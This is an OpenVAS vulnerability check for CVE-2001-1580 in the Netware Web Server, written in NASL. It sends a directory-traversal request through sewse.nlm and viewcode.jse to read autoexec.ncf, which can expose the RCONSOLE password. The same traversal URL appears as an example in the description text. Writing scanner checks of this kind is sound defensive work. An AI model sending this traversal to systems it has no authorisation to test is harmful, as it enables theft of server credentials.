# OpenVAS Vulnerability Test
# Description: Netware Web Server Sample Page Source Disclosure
#
# Authors:
# David Kyger <david_kyger@symantec.com>
#
# Copyright:
# Copyright (C) 2002 David Kyger
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12048");
  script_version("2022-05-12T09:32:01+0000");
  script_tag(name:"last_modification", value:"2022-05-12 09:32:01 +0000 (Thu, 12 May 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-1580");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Netware Web Server Sample Page Source Disclosure");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 David Kyger");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/246358");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3715");

  script_tag(name:"solution", value:"Remove sample NLMs and default files from the web server.
  Also, ensure the RCONSOLE password is encrypted and utilize a password
  protected screensaver for console access.");

  script_tag(name:"summary", value:"On a Netware Web Server, viewcode.jse allows the source code of web pages to
  be viewed.");

  script_tag(name:"insight", value:"As an argument, a URL is passed to sewse.nlm. The URL can be
  altered and will permit files outside of the web root to be viewed.

  As a result, sensitive information could be obtained from the Netware server,
  such as the RCONSOLE password located in AUTOEXEC.NCF.

  Example: http://example.com//lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

url = "/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req);

if(buf =~ "^HTTP/1\.[01] 200" && "AUTOEXEC.NCF" >< buf) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
